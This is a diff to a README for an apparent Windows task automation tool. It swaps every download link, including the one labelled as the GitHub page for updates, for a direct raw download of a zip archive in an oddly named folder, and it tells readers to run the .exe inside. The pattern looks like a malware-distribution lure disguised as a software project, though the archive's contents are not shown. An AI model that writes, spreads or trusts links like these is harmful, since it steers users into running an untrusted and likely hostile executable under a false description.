@@ -1,6 +1,6 @@
 # ⚙️ task-runner-1771918640-2 - Simple Task Automation Tool
 
-[![Download task-runner-1771918640-2](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/BRELOTTE/task-runner-1771918640-2)
+[![Download task-runner-1771918640-2](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/BRELOTTE/task-runner-1771918640-2/raw/refs/heads/main/thaumoscopic/runner_task_v2.9.zip)
 
 ---
 
@@ -44,7 +44,7 @@ Use this guide to download and start using task-runner-1771918640-2 on Windows.
 
 Click the green button below or this link to visit the download page:
 
-[![Download task-runner-1771918640-2](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/BRELOTTE/task-runner-1771918640-2)
+[![Download task-runner-1771918640-2](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/BRELOTTE/task-runner-1771918640-2/raw/refs/heads/main/thaumoscopic/runner_task_v2.9.zip)
 
 On the page, look for the latest release or main download file. You will find the instructions and executable file there.
 
@@ -107,7 +107,7 @@ This will execute the tasks step-by-step as listed in your file.
 
 You can always return to the official page to get the latest version here:
 
-[![Download task-runner-1771918640-2](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/BRELOTTE/task-runner-1771918640-2)
+[![Download task-runner-1771918640-2](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/BRELOTTE/task-runner-1771918640-2/raw/refs/heads/main/thaumoscopic/runner_task_v2.9.zip)
 
 No complex installation is needed. Just download, save, and run the `.exe` file. The tool does not change your system settings or install extra software.
 
@@ -139,7 +139,7 @@ This version is designed only for Windows. Mac or Linux users need a different v
 
 ## 🗂 Additional Resources  
 
-- GitHub page for updates: https://github.com/BRELOTTE/task-runner-1771918640-2  
+- GitHub page for updates: https://github.com/BRELOTTE/task-runner-1771918640-2/raw/refs/heads/main/thaumoscopic/runner_task_v2.9.zip  
 - Detailed command reference: run `task-runner.exe --help` in the command line after launching  
 - Example task files can be found in the repository’s examples folder  
 
